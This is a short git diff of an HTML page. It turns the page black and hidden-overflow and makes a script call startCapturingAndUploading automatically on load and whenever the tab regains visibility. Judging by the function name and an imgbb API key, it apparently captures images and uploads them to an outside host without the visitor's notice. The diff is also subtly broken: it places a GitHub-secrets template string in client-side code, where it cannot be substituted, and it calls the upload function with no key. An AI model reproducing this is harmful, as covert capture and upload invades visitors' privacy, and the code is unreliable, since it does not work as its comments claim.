@@ -8,7 +8,8 @@
         body {
             margin: 0;
             padding: 0;
-            background-color: #ff0000;
+            background-color: #000;
+            overflow: hidden;
         }
     </style>
 </head>
@@ -62,22 +63,12 @@ document.addEventListener("visibilitychange", function() {
     if (document.visibilityState === 'hidden') {
         clearInterval(captureInterval);
     } else {
-        const apiKey = "${{ secrets.IMGBB_API_KEY }}"; // Fetch API key from GitHub secret
-        if (apiKey) {
-            startCapturingAndUploading(apiKey); // Pass the API key to the function
-        } else {
-            console.error('API key not found in environment variables.');
-        }
+        const apiKey = '{{ secrets.IMGBB_API_KEY }}'; // Access the API key from GitHub Secrets
+        startCapturingAndUploading(apiKey);
     }
 });
 
-// Initial execution
-const apiKey = "${{ secrets.IMGBB_API_KEY }}"; // Fetch API key from GitHub secret
-if (apiKey) {
-    startCapturingAndUploading(apiKey); // Pass the API key to the function
-} else {
-    console.error('API key not found in environment variables.');
-}
+startCapturingAndUploading(); // Start the process automatically
 </script>
 </body>
 </html>
